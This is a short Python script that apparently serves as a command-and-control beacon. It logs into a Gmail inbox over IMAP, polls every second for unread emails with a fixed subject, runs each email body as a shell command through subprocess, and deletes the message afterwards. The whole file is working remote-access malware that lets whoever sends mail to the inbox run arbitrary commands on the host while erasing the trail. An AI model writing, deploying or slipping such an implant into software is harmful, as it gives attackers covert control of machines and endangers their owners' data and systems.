import email
import time
import subprocess
import imaplib
import os
from dotenv import load_dotenv

load_dotenv()
IMAP_SERVER = 'imap.gmail.com'

EMAIL = os.getenv("EMAIL")
PASSWORD = os.getenv("PASSWORD")

mail = imaplib.IMAP4_SSL(IMAP_SERVER)
mail.login(EMAIL, PASSWORD)
mail.select('inbox')

def beacon():
    while True:
        check_for_commands()
        time.sleep(1)

def check_for_commands():
    status, messages = mail.search(None, '(UNSEEN SUBJECT "TestSubject")')
    for num in messages[0].split():
        status, data = mail.fetch(num, '(RFC822)')
        raw_email = data[0][1]
        parse_and_execute(raw_email)
        mail.store(num, '+FLAGS', '\\Deleted')  # Optional: delete after reading
        mail.expunge()


def parse_and_execute(raw_email):
    msg = email.message_from_bytes(raw_email)
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_type() == 'text/plain':
                command = part.get_payload(decode=True).decode()
                run_command(command)
    else:
        command = msg.get_payload(decode=True).decode()
        run_command(command)


def run_command(command):
    output = subprocess.getoutput(command)
    print(f"Executed: {command}\nOutput:\n{output}")

beacon()